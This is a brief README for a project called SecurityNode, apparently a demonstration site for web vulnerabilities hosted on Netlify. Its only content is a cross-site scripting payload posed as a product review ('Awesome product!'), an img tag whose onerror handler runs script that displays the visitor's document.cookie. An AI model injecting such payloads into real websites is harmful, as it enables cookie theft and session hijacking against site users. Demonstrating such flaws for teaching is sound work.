# SecurityNode
[![Netlify Status](https://api.netlify.com/api/v1/badges/236e6c62-ed0d-4a0c-b2b6-c30bb8e14737/deploy-status)](https://app.netlify.com/sites/objective-snyder-f1032e/deploys)

Build & Deploy on Netlify on https://objective-snyder-f1032e.netlify.app/

### XSS
```
Awesome product!
<img src="xyz" style="display:none" onerror="alert(`Your Cookies: ${document.cookie}`);">
```
